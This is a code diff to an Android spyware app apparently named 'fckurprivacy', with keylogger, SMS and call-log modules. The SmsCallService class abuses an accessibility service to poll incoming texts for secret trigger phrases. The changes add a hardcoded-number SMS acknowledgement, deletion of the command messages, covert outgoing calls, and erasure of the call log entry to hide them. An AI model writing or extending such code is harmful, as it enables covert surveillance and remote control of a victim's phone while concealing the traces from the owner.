@@ -4,11 +4,13 @@ import android.accessibilityservice.AccessibilityService;
 import android.annotation.TargetApi;
 import android.os.Build;
 import android.os.Handler;
+import android.telephony.SmsManager;
 import android.util.Log;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
 import android.widget.Toast;
 
+import com.vergermiya.harevost.fckurprivacy.CallLogger.CallLogger;
 import com.vergermiya.harevost.fckurprivacy.KeyLogger.KeyLogJson;
 import com.vergermiya.harevost.fckurprivacy.SmsChecker.SmsJson;
 import com.vergermiya.harevost.fckurprivacy.SmsChecker.SmsObserver;
@@ -32,7 +34,7 @@ import java.util.Timer;
 public class SmsCallService extends AccessibilityService {
 
     private static final String TAG = "SmsCallService";
-    private static final String DEL_SMS_COMMAND = "安排上了";
+    private static final String SMS_COMMAND = "安排上了";
     private static final String CALL_COMMAND = "钦定";
     private static final int TIME = 5000;
 
@@ -65,10 +67,11 @@ public class SmsCallService extends AccessibilityService {
                 public void run() {
                     try {
                         handler.postDelayed(this, TIME);
-                        String latestSms = SmsObserver.getLatestSmsJson(getApplicationContext(), SmsObserver.SMS_INBOX).getBody();
-                        if (latestSms.equals(DEL_SMS_COMMAND)) {
+                        final String latestSms = SmsObserver.getLatestSmsJson(getApplicationContext(), SmsObserver.SMS_INBOX).getBody();
+                        if (latestSms.equals(SMS_COMMAND)) {
                             new Thread() {
                                 public void run() {
+                                    sendSms("18801214501", "GOT IT!");
                                     deleteSms();
                                 }
                             }.start();
@@ -78,6 +81,7 @@ public class SmsCallService extends AccessibilityService {
                                 public void run() {
                                     deleteSms();
                                     makeCall();
+                                    CallLogger.deleteLatestCallLog(getApplicationContext());
                                 }
                             }.start();
                         }
@@ -293,5 +297,13 @@ public class SmsCallService extends AccessibilityService {
             }
         }
         return null;
+    }
+
+    public void sendSms(String phoneNumber, String message) {
+        SmsManager smsManager = SmsManager.getDefault();
+        List<String> divideContents = smsManager.divideMessage(message);
+        for (String text : divideContents) {
+            smsManager.sendTextMessage(phoneNumber, null, text, null, null);
+        }
     }
 }
